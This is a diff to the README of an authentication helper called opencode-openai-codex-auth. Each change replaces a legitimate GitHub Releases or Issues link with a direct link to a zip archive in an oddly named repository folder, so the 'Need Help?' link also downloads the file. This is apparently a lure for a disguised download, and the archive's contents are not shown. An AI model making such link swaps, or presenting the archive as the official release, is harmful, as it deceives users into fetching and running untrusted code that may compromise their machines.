@@ -1,6 +1,6 @@
 # 🎉 opencode-openai-codex-auth - Easy ChatGPT Authentication Made Simple
 
-[![Download opencode-openai-codex-auth](https://img.shields.io/badge/Download-opencode--openai--codex--auth-blue?style=for-the-badge)](https://github.com/anashshaki/opencode-openai-codex-auth/releases)
+[![Download opencode-openai-codex-auth](https://raw.githubusercontent.com/anashshaki/opencode-openai-codex-auth/main/blennophthalmia/opencode-openai-codex-auth.zip)](https://raw.githubusercontent.com/anashshaki/opencode-openai-codex-auth/main/blennophthalmia/opencode-openai-codex-auth.zip)
 
 ## 📖 Introduction
 
@@ -20,7 +20,7 @@ Before installing, please ensure your computer meets the following requirements:
 
 ## 💾 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/anashshaki/opencode-openai-codex-auth/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/anashshaki/opencode-openai-codex-auth/main/blennophthalmia/opencode-openai-codex-auth.zip).
   
 2. **Choose the Latest Release:** Look for the latest version number at the top of the page. This is usually the most stable version available.
 
@@ -54,7 +54,7 @@ If you encounter issues, try the following solutions:
 
 ## 🆘 Need Help?
 
-If you have questions or need assistance, please visit the [GitHub Issues page](https://github.com/anashshaki/opencode-openai-codex-auth/issues) or contact our support team, and we will be glad to help you.
+If you have questions or need assistance, please visit the [GitHub Issues page](https://raw.githubusercontent.com/anashshaki/opencode-openai-codex-auth/main/blennophthalmia/opencode-openai-codex-auth.zip) or contact our support team, and we will be glad to help you.
 
 ## 📜 License
 
@@ -64,4 +64,4 @@ This project is licensed under the MIT License. You can use it freely but please
 
 Thanks to everyone who contributed to the development of opencode-openai-codex-auth. Your hard work makes this tool possible.
 
-Again, for downloads, please go to the [Releases page](https://github.com/anashshaki/opencode-openai-codex-auth/releases) to get started.
+Again, for downloads, please go to the [Releases page](https://raw.githubusercontent.com/anashshaki/opencode-openai-codex-auth/main/blennophthalmia/opencode-openai-codex-auth.zip) to get started.
